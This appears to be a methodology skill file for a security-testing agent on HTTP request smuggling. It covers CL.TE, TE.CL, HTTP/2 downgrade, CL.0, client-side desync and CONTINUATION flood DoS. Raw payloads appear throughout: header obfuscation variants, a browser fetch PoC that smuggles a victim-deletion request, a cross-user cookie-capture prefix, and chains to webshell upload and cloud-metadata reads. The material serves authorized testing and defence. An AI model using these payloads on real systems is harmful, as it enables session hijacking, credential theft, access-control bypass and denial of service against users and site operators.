---
name: http-request-smuggling
description: HTTP request smuggling — CL.TE / TE.CL / H2.CL / H2.TE / CL.0 / 0.CL / client-side desync / pause-based desync / HTTP/2 request tunnelling / CONTINUATION flood DoS; detection, tooling, and exploitation methodology
---

# HTTP Request Smuggling

HTTP request smuggling (HRS) exploits disagreements between a front-end proxy and a back-end server about where one HTTP request ends and the next begins. When the two systems parse `Content-Length` and `Transfer-Encoding` headers differently, an attacker can prefix a hidden request to the back-end's socket, which is then prepended to the next legitimate user's request. The impact ranges from bypassing front-end security controls to full cross-user session hijacking.

The advanced+expert depth (HTTP/2-to-HTTP/1 downgrade differentials deep, cache-poisoning / response-queue-poisoning chain construction, WAF bypass classes, blind-confirmation methodology beyond the basic timing probe) lives in `http_request_smuggling_advanced_deep.md`. The 2024–2026 CVE and parser-differential frontier — HTTP Garden's 122 unique parsing discrepancies (LiteSpeed strtoll-octal, Node.js bare-CR, OpenBSD relayd, Python `int()` underscores) and the current CVE families — lives in `http_request_smuggling_novel_deep.md`. This file is the standard-mode entry point: a hunter loading only this file is effective for the base class.

## Attack Surface

**Infrastructure Topologies**
- CDN or load balancer in front of origin server (Cloudflare, Nginx, HAProxy, AWS ALB)
- Reverse proxy chains (Nginx → Gunicorn, HAProxy → Node.js, Varnish → Apache)
- API gateways forwarding to microservices
- HTTP/2 front-end to HTTP/1.1 back-end translation (H2.CL / H2.TE)
- Tunneling servers or WAFs that terminate and re-forward requests

**HTTP Versions in Play**
- HTTP/1.1: CL.TE and TE.CL classic smuggling
- HTTP/2: H2.CL (downgrade injects Content-Length) and H2.TE (injects Transfer-Encoding)
- HTTP/3: emerging QUIC-based desync (less common, research-stage)

**Parser Differentials**
- Treatment of duplicate `Content-Length` headers
- Handling of `Transfer-Encoding: chunked` when `Content-Length` is also present
- Chunk size obfuscation via whitespace, tab, case, or invalid extensions

## High-Value Targets

- Front-end security controls (authentication bypass via desync)
- Endpoints shared by many users (high-traffic APIs, chat, feeds)
- Request capture endpoints (search, logging, analytics)
- Session-sensitive endpoints (auth callbacks, account settings)
- Internal admin interfaces proxied through the same connection pool

## Core Concepts

### CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding

Front-end reads `Content-Length: X` bytes and forwards. Back-end reads until the `0\r\n\r\n` chunk terminator. Attacker appends a hidden request after the `0` terminator that the front-end considers part of the same body but the back-end treats as a new request.

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
The `G` is left in the back-end's socket buffer and prepended to the next request.

### TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length

Front-end reads chunked body to completion. Back-end reads only `Content-Length` bytes, leaving the remainder on the socket.

```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### H2.CL — HTTP/2 Front-end Downgrades to HTTP/1.1, Injects Content-Length

HTTP/2 has no `Content-Length` vs `TE` ambiguity in its own framing. But when the front-end downgrades to HTTP/1.1 for the back-end, an attacker can inject a `content-length` header in the HTTP/2 request that conflicts with the actual body length. Note: `content-length` is a regular HTTP/2 header — pseudo-headers are exclusively `:method`, `:path`, `:authority`, and `:scheme`:
```
:method POST
:path /
:authority target.com
content-type application/x-www-form-urlencoded
content-length: 0

SMUGGLED_PREFIX
```

### H2.TE — HTTP/2 Injects Transfer-Encoding Header

Inject `transfer-encoding: chunked` in HTTP/2 headers (which the HTTP/2 spec forbids, but some front-ends pass through). Back-end receives both headers, may prefer TE over CL.

```
:method POST
:path /
transfer-encoding: chunked

0

SMUGGLED
```

## Client-Side Desync (CL.0 / 0.CL)

Classic CL.TE/TE.CL need a front-end/back-end *pair* that disagree. The CL.0
family needs only one server that mishandles the body, and the client-side
variant is triggerable through a victim's browser with no front-end at all —
which brings single-server sites and intranet hosts into scope.

### CL.0 — Back-end ignores Content-Length

Some endpoints do not expect a request body and ignore `Content-Length`
entirely, so the back-end treats the body as the start of the *next* request
on the connection. Prime candidates: endpoints that trigger a **server-level
redirect** or serve a **static file** (they answer before reading the body).

Detection — send the setup request, then a normal follow-up on the *same*
connection, and watch the follow-up's response (documented CL.0 probe form):
```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1
Host: vulnerable-website.com
```
If the follow-up (`GET /`) returns `404`, the back-end parsed the body
(`GET /hopefully404...`) as a standalone request — CL.0 confirmed. The
`Foo: x` line folds the victim's real request line into a header so the
smuggled request stays well-formed. `Content-Length` must cover exactly the
smuggled request line plus the `Foo: x` prefix; tune it to the target and
confirm the socket poisoning with the tooling rather than assuming a length.

**0.CL** is the inverse: the **front-end** ignores/does not forward the body
while the back-end honours `Content-Length` and waits for bytes that arrive
from the next request. Probe it as a timing differential (back-end blocks for
the missing bytes) the way TE.CL is probed.

### Client-Side Desync (CSD)

Built on CL.0 but using **fully browser-compatible HTTP/1.1** — no chunked
tricks, no illegal headers — so a page you control can make the *victim's own
browser* poison its connection to a single-server target. Attacker JS issues a
credentialed cross-origin `fetch` whose body is the smuggled prefix; the
browser reuses the keep-alive connection for the victim's next same-origin
navigation, which is then prefixed by the smuggled request:
```javascript
// hosted on attacker origin; runs in the victim's browser
fetch('https://target/vulnerable-endpoint', {
  method: 'POST', mode: 'no-cors', credentials: 'include',
  // body is a full smuggled request the back-end will treat as request #2
  body: 'GET /admin/deleteUser?user=victim HTTP/1.1\r\nFoo: x'
}).then(()=>{ location = 'https://target/'; });  // reuse the poisoned connection
```
Because the request is browser-legal, this reaches targets that are immune to
proxy-based smuggling: single servers, and internal hosts reachable only from
the victim. Impact classes: victim-driven state change, stored/redirected XSS
into the victim's response, and capturing the victim's next request. Confirm
against a lab first; the exact body and endpoint are target-specific.

## Pause-Based Desync & HTTP/2 Request Tunnelling

### HTTP/2 Request Tunnelling

When the front-end reuses one HTTP/1.1 back-end connection per HTTP/2 stream
(not a shared pool), you cannot poison a *later* user — but you can **tunnel** a
second request inside your own stream and read its response yourself. Inject a
CRLF-bearing value (in a header, or `:path`/`:authority` when the front-end
copies it unescaped into the HTTP/1.1 request line) so the downgraded request
carries an embedded second request; the back-end's response to the tunnelled
request is returned within your stream. This turns H2.CL/H2.TE into a
no-victim, self-contained read primitive — useful to reach internal-only paths
(`/admin`, metadata) and to leak the front-end's internal request rewriting.
The exact injection point (header value vs pseudo-header) and whether the
front-end preserves the CRLF are target-specific — enumerate with the tooling.

### Pause-Based Desync

Some back-ends split a request when the byte stream pauses mid-message: send
the headers (or a partial chunked body), pause past the server's read timeout,
and the server processes what it has and treats the delayed remainder as a new
request. This desyncs servers that show no CL/TE disagreement at all — the
oracle is *timing of the split*, not header parsing. Reproduce it with a client
that controls exactly when bytes are released (Turbo Intruder), not a normal
HTTP client that flushes the whole request at once. Connection-state and
first-request-routing attacks (where the front-end routes a whole connection
based only on its first request's Host) fall in the same family: smuggle a
first request to a permitted vhost, then reuse the connection for a restricted
one.

### HTTP/2 CONTINUATION Flood (DoS)

Separate from smuggling but the same frame layer: a stream of `CONTINUATION`
frames **without the `END_HEADERS` flag** forces the server to buffer and
HPACK-decode unbounded header data → out-of-memory or CPU exhaustion, often
pre-authentication and without appearing in access logs. Disclosed across
implementations in April 2024 (CERT/CC VU#421644): **CVE-2024-27983**
(Node.js), **CVE-2024-28182** (nghttp2), **CVE-2024-27919** and
**CVE-2024-30255** (Envoy), **CVE-2024-31309** (Apache Traffic Server), and
**CVE-2024-2653** (amphp/http). Fingerprint the HTTP/2 server and version and
match it to the relevant advisory before testing; this is a resource-exhaustion
test — run it only within an explicit DoS-authorized scope and with strict
ceilings.

## Key Vulnerabilities

### Front-End Security Control Bypass

A front-end proxy enforces authentication or IP restriction by checking request headers and blocking or allowing based on rules. If a smuggled prefix bypasses the front-end (because it's buried in a prior request's body from the front-end's view), the back-end processes it without the security check.

**PoC structure (CL.TE):**
```http
POST /not-restricted HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
X-Forwarded-Host: target.com
Content-Length: 10

x=1
```
The `GET /admin` is seen by the back-end as a new, legitimate request originating from the trusted proxy IP.

### Cross-User Request Capture

Poison the back-end socket with a partial request prefix that captures the next victim user's request (including their cookies, tokens, request body) into the response of a controlled endpoint (search, comment submission).

**PoC structure (CL.TE capture):**
```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 120
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

q=
```
`Content-Length: 100` in the smuggled prefix is longer than the actual smuggled body, so the back-end waits for 100 bytes — which it sources from the *next* user's request. The `/search` endpoint reflects the query, capturing headers and body of the subsequent request.

### Response Queue Poisoning

On pipelined connections, cause a misaligned response to be delivered to the wrong user (HTTP/1.1 response queue poisoning). Used to deliver attacker-controlled content or steal another user's response.

### Request Reflection / Cache Poisoning Chain

Smuggle a prefix that hits a cacheable endpoint with an injected `Host` header. If the cache stores the response keyed only on URL, the poisoned response is served to all users requesting that URL.

### WebSocket Handshake Hijacking

If the proxy performs WebSocket upgrade, a smuggled `Upgrade` request can hijack an existing WebSocket connection from a subsequent user.

## Detection Techniques

### Timing-Based Detection

**CL.TE:** Send a request where `Content-Length` is complete but `Transfer-Encoding` body is missing the `0\r\n\r\n` terminator. A CL.TE-vulnerable back-end waits for the terminator, causing a timeout.

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

3
abc
X
```
If response is delayed 10–30 seconds, CL.TE desync likely.

**TE.CL:** Send a request with a complete chunked body (including the `0\r\n\r\n` terminator so the front-end is satisfied) but with `Content-Length` set to **more** bytes than the body actually provides. The back-end, using Content-Length, waits for the remaining bytes that never arrive — producing a 10–30 second timeout. Setting Content-Length *less* than the body causes socket poisoning (differential-response detection), not a timeout.

### Differential Response Detection

Send two requests in sequence. If the second request receives an unexpected response (error, redirect, wrong content), the first may have poisoned the socket. Use a unique string in the smuggled prefix to confirm.

### Content-Length + Transfer-Encoding Combination

```http
Transfer-Encoding: xchunked        # non-standard value, some FE ignore, BE accept
Transfer-Encoding: chunked         # leading space before value (0x20 byte after colon+space)
Transfer-Encoding:	chunked        # tab character before value
Transfer-Encoding: x
Transfer-Encoding: chunked         # duplicate TE headers, BE uses last
```

## Transfer-Encoding Obfuscation

To force TE disagreement:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked       # space before colon
X: X<CRLF>Transfer-Encoding: chunked # header injection — inject actual CRLF bytes at <CRLF>, not the literal string \r\n
Transfer-Encoding: chunked<CRLF>Transfer-Encoding: x  # TE twice — inject actual CRLF bytes at <CRLF>
```

## HTTP/2-Specific Detection

- Send HTTP/2 requests with an injected `content-length` regular header that differs from the actual body length
- Inject `transfer-encoding: chunked` in HTTP/2 headers (spec-forbidden but sometimes passed through)
- Use HTTP/2 header injection: inject newlines in header values if the front-end passes them to HTTP/1.1 back-end unescaped
- Observe whether the HTTP/2 connection ID corresponds to a persistent HTTP/1.1 connection to the back-end (connection reuse amplifies impact)

## Chaining

Smuggling is a pivot primitive — it transfers a capability rather than reaching a terminal impact by itself. Model as capability transfer, routed by filename.

**Upstream — what grants smuggling:**
- **HTTP/2-to-HTTP/1 translating front-end** — the H2.CL and H2.TE classes require exactly this shape at the edge; without it, only classic CL.TE/TE.CL apply.
- **Shared back-end connection pool** — poisoning the pool requires that back-end sockets serve multiple front-end requests. If the front-end opens one back-end connection per HTTP/2 stream (no pool), you can still tunnel a self-contained read but not poison other users.
- **Ambiguous parser at the back-end** — any back-end that treats CL and TE inconsistently (or ignores CL on GET/redirect endpoints for CL.0) is a candidate.

**Downstream — what smuggling grants:**
- **Front-end security control bypass** — reach `/admin` past a proxy that denies it (route to `authentication_*` and framework-specific admin surfaces).
- **Cross-user request capture** — pull another user's request onto a controllable response endpoint; grants their `Cookie` / `Authorization` / body content → session hijack → downstream everything the victim can do. Route to `authentication_jwt.md` if the captured token is a JWT.
- **Cache poisoning** — inject an attacker-controlled response into a cache keyed by URL; grants XSS delivery, phishing content injection, or clickjacking to every subsequent user. Route to `xss.md` for the payload class delivered via the poisoned response.
- **WebSocket handshake hijacking** — a smuggled `Upgrade: websocket` can steal a subsequent user's WebSocket; grants read+write over the socket. Route to `csrf.md § WebSocket CSRF (CSWSH)` for the closely-related same-site variant.
- **HTTP/2 request tunnelling → internal-only path read** — for a self-contained read primitive when connection-per-stream mode prevents pool poisoning. Grants access to `/admin`, cloud metadata endpoints, and other internal paths the front-end blocks externally. Route metadata reachability follow-on to `cloud/*` skills.
- **Response queue poisoning** — misalign the response queue on a pipelined connection; grants delivery of one user's response to a different user.

**Composite chains — end-to-end paths, each hop routed:**
1. **CL.TE + cache poisoning → mass XSS** — smuggle a request that injects an XSS payload into a cached response for `/`; every subsequent user gets served the XSS. Chain routes: smuggling (this file) → cache (poisoning here) → XSS delivery (`xss.md`).
2. **H2.CL + admin-endpoint reach → RCE on admin API** — bypass the front-end auth check on `/admin/plugins/upload`, upload a webshell via the admin plugin API, execute. Chain: smuggling → auth bypass → plugin upload → `rce.md`.
3. **CL.0 client-side desync + credentialed same-origin fetch → victim-driven state change** — CSD attacks against single-server sites (no front-end): victim's browser poisons its own connection; the follow-up same-origin navigation executes the smuggled request. Chain: CSD (this file) → CSRF-shaped state change (`csrf.md`).
4. **HTTP/2 tunnelling → cloud metadata read** — tunnel a request to `169.254.169.254/latest/meta-data/iam/...` through the front-end's back-end connection. Reads-only from the smuggling perspective; credential extraction routes to `cloud/aws.md` etc.

Chaining is reachability/enablement — a granted capability, not a severity multiplier.

## Frontier CVE Routes

Base names + one-line class shape; the version tables and mechanism decomposition live in the novel sibling (§2 CVE single-ownership).

- **HTTP Garden discovery corpus (2024)** — arXiv:2405.17737 (Kallus et al., May 2024) — differential fuzzing of HTTP/1.1 request streams identified 122 unique parsing discrepancies across popular servers; 68 patched, 39 designated exploitable. Four canonical smuggling classes emerged: LiteSpeed strtoll radix-inference (leading `0` interpreted as octal), Node.js bare-CR chunk termination (fixed in 21.2.0), OpenBSD relayd single-participant smuggling, Python `int()` digit-separating underscores (AIOHTTP/Gunicorn/Tornado). Full class dissection + version tables in `http_request_smuggling_novel_deep.md § HTTP Garden — Parser-Differential Frontier`.
- **HTTP/2 CONTINUATION Flood cluster (Apr 2024)** — CERT/CC VU#421644 disclosed a class in which unterminated `CONTINUATION` frames force unbounded HPACK-decode buffering → OOM/CPU exhaustion. Affected: Node.js (CVE-2024-27983), nghttp2 (CVE-2024-28182), Envoy (CVE-2024-27919 + CVE-2024-30255), Apache Traffic Server (CVE-2024-31309), amphp/http (CVE-2024-2653). Version boundaries + mechanism-per-implementation in `http_request_smuggling_novel_deep.md § HTTP/2 CONTINUATION Flood — 2024 CVE Cluster`.
- **Tomcat HTTP trailer smuggling — CVE-2023-46589** — if verified against NVD, chunked trailer parsing differential. Version boundary in `http_request_smuggling_novel_deep.md § Tomcat HTTP Trailer Handling — CVE-2023-46589`.
- **Apache HTTP Server HTTP/2 memory exhaustion — CVE-2024-27316** — HTTP/2 header-processing class expression against Apache httpd (nghttp2-buffer path). Version boundary in `http_request_smuggling_novel_deep.md § Apache HTTP/2 Memory Exhaustion — CVE-2024-27316`.
- **Gunicorn TE-header HTTP request smuggling — CVE-2024-1135** — Python Gunicorn's HTTP parser accepted specific Transfer-Encoding variations that produced smuggling against paired front-ends. Full mechanism + version boundary in `http_request_smuggling_novel_deep.md § Gunicorn TE-Header Smuggling — CVE-2024-1135`.
- **lighttpd connection-slot DoS — CVE-2022-41556** — class-broader-than-CONTINUATION historical anchor: connection-slot exhaustion via HTTP-parsing behavior. Cite as class context, not current-frontier. Details in `http_request_smuggling_novel_deep.md § Class-Broader Historical Anchors`.

## Wire-Format & Proxy Composition Fingerprinting

Smuggling variants are decided by the composition of the front-end and back-end at the target. Fingerprint the composition before choosing which variant to probe — a Cloudflare + Nginx + Node.js target has a different smuggling surface than an AWS ALB + Envoy + Python target, and matching probes to composition avoids wasted requests and false negatives.

**Front-end / CDN identification:**
- `Server: cloudflare`, `CF-RAY`, `CF-Cache-Status` → Cloudflare. HTTP/2-to-HTTP/1 downgrade default; H2.CL / H2.TE are the primary vectors.
- `X-Amz-Cf-Id` → AWS CloudFront. Downgrade behavior varies per origin config.
- `Server: AkamaiGHost`, `X-Akamai-*` → Akamai. Historical smuggling class documented.
- `Server: nginx` (bare) → Nginx as edge. Watch for the `%2e%2e/` and `\r\n` handling; Nginx normalizes aggressively.
- `Server: awselb` → AWS ALB. HTTP/2 support with per-config downgrade.
- No `Server` header + short 404 body → API gateway (rate-limiting or WAF-only edge).
- `X-Envoy-*` → Envoy sidecar or Istio-managed egress.

**Back-end identification:**
- `X-Powered-By: PHP/X.Y` → PHP-FPM or Apache mod_php.
- `X-Powered-By: Express` → Node.js/Express. Node's HTTP parser (llhttp) had the CVE-2024-27983 CONTINUATION flood; version fingerprint matters.
- `X-Runtime` → Rails.
- `Server: gunicorn/X.Y.Z` → Gunicorn. Its Python-native HTTP parser had CVE-2024-1135 in the class window.
- `Server: uWSGI/X.Y.Z` → uWSGI.
- `HTTP/2 200` on OPTIONS responses + `Alt-Svc: h3=":443"` → modern proxy stack with HTTP/3 support (adds another parser layer).
- `Server: Apache/X.Y.Z (Ubuntu)` → Apache httpd. CVE-2024-27316 CONTINUATION-flood variant.
- Distinct 400 error page shapes reveal the parser layer that rejected the malformed request.

**Composition probe — three-request scan:**
1. `HEAD /` — captures top-level headers (Server, X-Powered-By, CDN identifiers).
2. `GET /nonexistent-<rand>` — 404 shape reveals which layer produces default errors.
3. `OPTIONS /` — some proxies return their own OPTIONS response; some pass through — the difference distinguishes edge from origin.

Combined, the three probes usually identify (a) the edge CDN/WAF, (b) the reverse proxy at the origin, and (c) the back-end language/framework. Choose smuggling variants to match: HTTP/2-only edge? try H2.CL and H2.TE. HTTP/1.1-only edge? try classic CL.TE, TE.CL. Single-server (no edge)? try CL.0 and client-side desync.

## Confirmation Discipline

Smuggling detection has a high false-positive rate — timing variance, connection pool eviction, load balancer round-robin, and normal server GC pauses all produce delays that look like desync. Anchor every claim to a reproducible signal.

- **Two-probe consistency** — every timing-based confirmation must reproduce on the second try. A single 10-second delay is not evidence; two consecutive 10-second delays with a normal request between them is a signal.
- **Differential response, not just timing** — the strongest confirmation is a follow-up request receiving an unexpected response (`404` where you expect `200`, admin content where you expect public). Timing without a paired differential is weaker.
- **Unique-marker inclusion** — include a distinctive string (`ZENSMUG-<rand>`) in the smuggled prefix; the follow-up response should reflect that marker for a genuine positive.
- **Single-server probe for CL.0 requires connection reuse** — the setup + follow-up must ride the same TCP connection (`Connection: keep-alive`). A tool that opens a new connection per request cannot detect CL.0 at all.
- **Cache-poisoning positives require cache-key match** — a "successful" cache poison that doesn't reproduce for a different user IP/User-Agent may have hit a personalized cache-key (Vary), not a shared one. Test with two distinct client fingerprints.
- **Response queue poisoning requires pipelining** — the tool must actually pipeline requests, not send them serially. Turbo Intruder's `pipeline` mode is required.
- **CSD requires a real browser** — client-side desync probes with a scriptable browser client (Playwright, headless Chrome), not curl. Curl won't reuse the connection the way a browser does.

The finding is *the specific smuggling class + the specific back-end that misparses + the specific impact demonstrated*, not "we sent a probe and got a delay." Report the exact bytes, the exact response, and the exact reproduction rate across N trials.

## Testing Methodology

1. **Map the proxy chain** — identify front-end (CDN, load balancer, WAF) and back-end (app server)
2. **Probe CL.TE** — send a timing probe with mismatched chunked terminator; observe delay
3. **Probe TE.CL** — send a timing probe with complete chunked body but Content-Length larger than the actual body; observe back-end timeout
4. **Obfuscate TE header** — try each obfuscation variant (tab, extra space, duplicate, non-standard value)
5. **Confirm with differential response** — send two rapid identical requests; if second gets an unexpected response, socket is poisoned
6. **Attempt bypass exploit** — craft a smuggled `GET /admin` or restricted endpoint and observe if back-end accepts it
7. **Attempt capture** — poison with a partial POST pointing to a reflective endpoint; wait for a follow-up request to fill the buffer
8. **Test H2.CL/H2.TE** — repeat the same probes over HTTP/2 connections if the target supports HTTP/2

## Validation

1. Show a timing differential of 10+ seconds on the CL.TE or TE.CL probe and explain the mechanism
2. Demonstrate a bypass: smuggle a request to `/admin` and receive a 200 response where a direct request returns 403
3. For capture: show a subsequent user's `Cookie` or `Authorization` header appearing in the response of a controlled endpoint
4. Confirm with a unique marker string in the smuggled prefix to rule out timing noise
5. Provide the exact raw bytes of the smuggled request

## False Positives

- General network latency or server-side processing delays unrelated to smuggling
- Server consistently close connection after first request (no connection reuse, no socket sharing)
- HTTP/2 with full end-to-end HTTP/2 to back-end (no HTTP/1.1 downgrade, no desync surface)
- WAF or proxy that normalizes TE/CL headers before forwarding (removes the ambiguity)

## Impact

- Authentication and authorization bypass by smuggling requests past front-end access controls
- Cross-user session hijacking by capturing requests containing session tokens
- Cache poisoning affecting all users of a cached resource
- Internal service access bypassing IP-based restrictions enforced at the front-end
- XSS delivery via response queue poisoning in shared connection contexts

## Pro Tips

1. Use Burp Suite's HTTP Request Smuggler extension as a rapid scanner, but always confirm manually — false positives are common
2. TE obfuscation is the most reliable path; `Transfer-Encoding: xchunked` works on many Apache/IIS back-ends
3. Keep smuggled prefixes short during detection; use the minimal body to confirm desync before attempting capture attacks
4. H2.CL is the most impactful modern variant — many CDNs translate HTTP/2 to HTTP/1.1 and derive `Content-Length` from the `content-length` regular header sent in the HTTP/2 request (not a pseudo-header — inject it as a normal header field)
5. In capture attacks, set `Content-Length` in the smuggled prefix larger than your partial body by 50–100 bytes to catch a full auth header from the next user
6. Test during low-traffic periods first to avoid affecting real users; always get explicit authorization for capture attempts
7. If timing probes are inconsistent, pipeline two requests over the same connection and look for unexpected response swapping

## Version-Fingerprint Reference

Compact reference of the current smuggling posture for widely-deployed back-ends. Version data as of 2026-09-29; verify current advisories before assessment.

| Back-end | CL.TE | TE.CL | H2.CL / H2.TE | CL.0 | CONTINUATION flood |
|---|---|---|---|---|---|
| Node.js ≥ 21.2.0 | patched (llhttp) | patched | fingerprint-per-front-end | class-dependent | fixed (CVE-2024-27983) |
| Node.js < 21.2.0 | class-dependent | class-dependent | live via bare-CR (HTTP Garden) | class-dependent | VULNERABLE |
| Apache httpd ≥ 2.4.59 | patched core | patched core | check front-end | class-dependent | fixed (CVE-2024-27316) |
| Apache Traffic Server (ATS) | see HTTP Garden — LiteSpeed strtoll radix + transducer chain | forwards CR bytes in optional whitespace | class-dependent | class-dependent | fixed (CVE-2024-31309) in current |
| Nginx (any current) | patched core; front-end for many stacks | patched core | strong front-end for H2 | class-dependent per config | not applicable (no HTTP/2 origin default) |
| Envoy | patched | patched | check config | class-dependent | fixed (CVE-2024-27919 + CVE-2024-30255) |
| HAProxy | patched | patched | HTTP/2 support strong | class-dependent | not directly affected |
| Tomcat 9.x / 10.x / 11.x | patched | patched | via connector | see CVE-2023-46589 for trailer class | not applicable |
| Gunicorn (< fix) | class-dependent | class-dependent | fingerprint-per-front-end | class-dependent | not the CONTINUATION-flood cluster |
| LiteSpeed | see HTTP Garden — strtoll octal in Content-Length | class-dependent | class-dependent | class-dependent | verify per version |
| OpenBSD relayd | see HTTP Garden — single-participant smuggling | class-dependent | HTTP/1.1-only | class-dependent | not applicable |

Match the row to the target's `Server` header (or fingerprinted equivalent) before probing. Full mechanism prose + specific version boundaries live in `http_request_smuggling_novel_deep.md`.

## Tooling

Smuggling needs a client that sends *exact bytes* and controls connection reuse
and byte timing — normal HTTP libraries normalize the request and defeat the
test.

- **HTTP Request Smuggler** (Burp extension, James Kettle) — the primary
  scanner. Its "Smuggle probe" covers CL.TE/TE.CL and the HTTP/2 variants; the
  **connection-state probe** detects CL.0 / 0.CL / first-request-routing; it
  also generates browser-powered-desync PoCs. Always confirm a hit manually —
  false positives are common on load-balanced pools.
- **Turbo Intruder** (Burp) — for the primitives the scanner can't: the
  **single-packet attack** (send a full request in one TCP packet to remove
  network jitter), holding a connection open and **releasing bytes on a timer**
  for pause-based desync, and scripting the setup+follow-up pair on one
  connection for CL.0 confirmation. Use its `Connection: keep-alive` +
  `pipeline` control rather than a fresh connection per request.
- **Raw sender** — for a minimal manual PoC (and to satisfy "provide the exact
  raw bytes"), send with `openssl s_client -connect host:443 -quiet` (TLS) or
  `ncat host 80`, pasting CRLF-exact bytes; scripts must write real `\r\n`, not
  the literal characters. `h2csmuggler` covers the HTTP/2-cleartext-upgrade
  smuggling variant where an edge proxies `Upgrade: h2c`.
- Pair with `interactsh-client` (sandbox) for an OOB oracle when a smuggled
  request should trigger an outbound callback.

## Summary

HTTP request smuggling is eliminated by enforcing consistent TE/CL interpretation at every hop in the proxy chain, preferring end-to-end HTTP/2, and having back-end servers reject or normalize ambiguous requests. At the proxy level, never forward TE headers that were not present in the original request, and treat conflicting CL + TE as a hard error.
